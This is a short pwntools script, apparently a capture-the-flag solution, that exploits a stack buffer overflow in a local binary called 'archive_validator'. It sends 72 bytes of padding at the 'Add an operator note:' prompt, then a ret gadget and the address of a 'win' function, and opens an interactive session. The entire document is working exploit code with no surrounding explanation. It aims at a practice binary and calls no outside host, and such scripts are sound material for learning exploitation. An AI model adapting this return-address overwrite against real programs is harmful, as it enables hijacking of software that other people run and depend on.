from pwn import *

context.binary = elf = ELF("./archive_validator")
rop = ROP(elf)

p = process(elf.path)

offset = 72
win_addr = 0x40124c
ret_addr = rop.find_gadget(["ret"]).address

log.info(f"ret gadget: {hex(ret_addr)}")
log.info(f"win function: {hex(win_addr)}")

payload = flat(
    b"A" * offset,
    ret_addr,
    win_addr
)

p.recvuntil(b"Add an operator note:")
p.sendline(payload)

p.interactive()
